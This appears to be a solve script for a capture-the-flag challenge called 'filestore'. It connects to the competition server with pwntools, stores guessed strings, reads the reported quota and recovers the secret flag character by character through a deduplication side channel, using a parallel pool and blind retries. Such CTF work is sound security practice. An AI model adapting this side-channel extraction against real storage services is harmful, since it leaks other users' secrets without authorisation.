import pwn
import itertools
import string
from multiprocessing import Pool
from collections import Counter

# We can get the charset by sending only one character
charset = "cdfinptuCFMRT0134_{}"
known = ""
use_prefix = True


def run(c):
    io = pwn.remote("filestore.2021.ctfcompetition.com", 1337, timeout=5)
    io.sendlineafter("- exit\n", "store")

    if use_prefix:
        io.sendlineafter("...\n", known + c)
    else:
        io.sendlineafter("...\n", c + known)

    io.sendlineafter("- exit\n", "status")
    io.recvuntil("Quota: ")
    io.close()

    f = float(io.recvlineS().strip()[: -len("kB/64.000kB")])
    print(f"{c} => {f}")
    return f


def run_wrapper(c):
    while True:
        try:
            return run(c)
        except:
            pass


def run_batch(chars):
    ans = []
    with Pool(32) as p:
        ans = p.map(run_wrapper, chars)
    return ans


def check_ans(ans):
    # Check that there are only two values
    if len(set(ans)) != 2:
        return None

    # Check that the minimum occurs only once
    c = Counter(ans)
    if c[min(ans)] != 1:
        return None

    i = ans.index(min(ans))
    return chars[i]


chars = (
    string.ascii_lowercase
    + string.ascii_uppercase
    + string.digits
    + "_!?{}[]()#$%^&*-+="
)

ans = run_batch(chars)
chars = "".join(chars[i] for i, f in enumerate(ans) if f == min(ans))
print(f"[+] chars = {chars}")

known = "CTF{"

while len(known) < 16:
    ans = run_batch(chars)
    c = check_ans(ans)
    assert c != None
    known += c
    print(f"[+] known = {known}")


start = known
known = "}"
use_prefix = False

# Pretty sure it's something like CTF{CR1M3_0f_d3duplication}

while "up" not in known:
    ans = run_batch(chars)

    c = check_ans(ans)
    if c == None:
        print(f"[*] Done")
        break

    known = c + known
    print(f"[+] known = {known}")

print(f"[*] Best guess: {start + known}")
